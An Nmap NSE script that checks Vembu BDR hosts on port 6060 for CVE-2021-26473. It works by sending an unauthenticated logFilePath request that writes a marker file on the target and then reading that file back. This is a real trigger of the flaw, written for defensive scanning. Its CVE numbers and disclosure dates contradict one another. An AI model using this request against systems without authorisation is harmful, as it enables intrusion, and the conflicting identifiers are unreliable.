description = [[
Detects whether the is vulnerable to CVE-2021-26473, a remote command execution vulnerability.
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"
local rand = require "rand"

---
-- @usage
-- nmap -p <port> --script vembu-vuln-cve2021-26471 <target>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 6060/tcp open  x11     syn-ack
-- | vembu-vuln-cve-2021-26473:
-- |   VULNERABLE:
-- |   CVE-2021-26473 - Vembu Unauthenticated Remote Command execution via logFilePath
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2021-26743
-- |       VembuBDR v4.2.0.1 is vulnerable to Unauthenticated remote command execution via logFilePath command
-- |
-- |     Disclosure date: 2021-04-11
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26743
-- |_      https://csirt.divd.nl/CVE-2021-26473

author = "Dutch Institute for Vulnerability Disclosue (DIVD) - Frank Breedijk"
license = "Apache 2.0"
categories = { "vuln" }

portrule = shortport.portnumber(6060)

action = function(host, port)
  local vuln = {
    title = "CVE-2021-26473 - Vembu Unauthenticated Remote Command execution via logFilePath",
    state = vulns.STATE.NOT_VULN,
    description = [[
VembuBDR v4.2.0.1 is vulnerable to Unauthenticated remote command execution via logFilePath command
    ]],
    IDS = {
        CVE = "CVE-2021-26741"
    },
    references = {
        'https://csirt.divd.nl/CVE-2021-26473'
    },
    dates = {
        disclosure = { year = '2021', month = '05', day = '15' }
    }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local method = "GET"
  local randomname = ".divd." .. rand.random_string(16,'utf-8')
  local path = "/sgwebservice_o.php?Action=logFilePath&path=./" .. randomname .. "&value=Your+system+was+tested+for+CVE-2021-26473"

  local header = {
    ["Cookie"] = ""
  }

  local response = http.get(host, port, path)
  if response and response.status == 200 then
    path = "/" .. randomname
    response = http.get(host, port, path)

    if response and response.status == 200 then
      vuln.state = vulns.STATE.VULN
      return vuln_report:make_output(vuln)
    else
      return "Unable to exploit CVE-2021-26473"
    end
  else
    return "Unable to exploit CVE-2021-26473"
  end
end
